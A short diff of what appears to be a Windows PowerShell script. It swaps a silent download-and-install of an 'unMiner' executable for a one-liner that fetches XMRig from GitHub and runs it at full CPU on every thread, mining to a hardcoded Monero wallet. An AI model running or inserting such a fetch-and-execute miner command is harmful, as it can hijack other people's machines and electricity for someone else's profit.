@@ -1,3 +1,1 @@
-Invoke-WebRequest -Uri "https://cdn.unmineable.download/unMiner.2.8.0-beta.exe" -OutFile "$env:TEMP\unMiner.exe"
-Start-Process -FilePath "$env:TEMP\unMiner.exe" -ArgumentList "/S" -Wait
-Start-Process -FilePath "$env:ProgramFiles\unMiner\unMiner.exe"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-msvc-win64.zip' -OutFile 'xmrig.zip'; Expand-Archive -Path 'xmrig.zip' -DestinationPath '.'; cd xmrig-*; .\xmrig.exe -o pool.supportxmr.com:443 -u 45WvRSeZuor9BbKMZF6s1VVvQriMjvScBbRLxoMTGe9c2J8Xnx4HySRHLLeTb8zf9944GD1uEmnpgUFFRHhJ7abSJXrmezb -p x -k --tls --huge-pages --randomx-1gb-pages --threads=$(Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty NumberOfLogicalProcessors) --cpu-priority=5 --max-cpu-usage=100 --donate-level=0"
